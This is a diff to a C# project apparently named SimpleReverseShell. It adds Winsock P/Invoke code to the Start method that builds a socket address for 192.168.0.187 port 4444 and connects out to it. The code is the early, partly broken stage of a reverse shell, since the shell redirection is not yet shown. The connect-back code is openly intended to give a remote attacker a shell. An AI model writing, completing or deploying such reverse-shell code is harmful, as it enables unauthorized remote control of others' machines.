@@ -6,6 +6,7 @@ using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using static SimpleReverseShell.SimpleSysCallShell;
 
 namespace SimpleReverseShell
 {
@@ -154,10 +155,10 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     internal struct SockAddr_In
     {
-      short s_family;
-      ushort s_port;
-      In_Addr s_addr;
-      char sin_zero;
+      internal short s_family;
+      internal ushort s_port;
+      internal In_Addr s_addr;
+      internal char sin_zero;
     }
 
     /// <summary>
@@ -167,10 +168,10 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     internal struct In_Addr
     {
-      byte s_b1;
-      byte s_b2;
-      byte s_b3;
-      byte s_b4;
+      internal byte s_b1;
+      internal byte s_b2;
+      internal byte s_b3;
+      internal byte s_b4;
     }
 
     /// <summary>
@@ -179,21 +180,8 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     internal struct SockAddr
     {
-      ushort sa_family;
-      char sa_data;
-    }
-
-    /// <summary>
-    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in
-    /// Address family immer 2 (IPv4).
-    /// </summary>
-    [StructLayout(LayoutKind.Sequential)]
-    internal struct SocketAddress
-    {
-      int af;
-      ushort port;
-      SockAddr_In in_addr;
-      char[] sin_zero;
+      internal ushort sa_family;
+      internal byte[] sa_data;
     }
 
     #endregion
@@ -201,8 +189,44 @@ namespace SimpleReverseShell
     public void Start()
     {
       var protcolInfo = new WSAPROTOCOL_INFOA();
-      var socketAddress = new SocketAddress();
+      var ipv4 = new SockAddr();
+
+      var addrIn = new In_Addr();
+      addrIn.s_b1 = 192;
+      addrIn.s_b2 = 168;
+      addrIn.s_b3 = 0;
+      addrIn.s_b4 = 187;
+
+      var sockAddrIn = new SockAddr_In();
+      sockAddrIn.s_family = 2;
+      sockAddrIn.s_port = 4444;
+      sockAddrIn.s_addr = addrIn;
+
+      var sockaddr = new SockAddr();
+      sockaddr.sa_family = (ushort)sockAddrIn.s_family;
+
+
+      sockaddr.sa_data = new byte[14];
+      // Copy port number (assuming it's in network byte order)
+      sockaddr.sa_data[0] = (byte)(sockAddrIn.s_port >> 8);  // High byte
+      sockaddr.sa_data[1] = (byte)(sockAddrIn.s_port & 0xFF); // Low byte
+
+      // Copy IPv4 address
+      sockaddr.sa_data[2] = sockAddrIn.s_addr.s_b1;
+      sockaddr.sa_data[3] = sockAddrIn.s_addr.s_b2;
+      sockaddr.sa_data[4] = sockAddrIn.s_addr.s_b3;
+      sockaddr.sa_data[5] = sockAddrIn.s_addr.s_b4;
+
+      // Fill the rest of the sa_data array with zeros
+      for (int i = 6; i < sockaddr.sa_data.Length; i++)
+      {
+        sockaddr.sa_data[i] = 0;
+      }
+
+
       var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);
+      connect(socket, ref sockaddr, Marshal.SizeOf(sockaddr));
+      // connect call.
     }
   }
 }
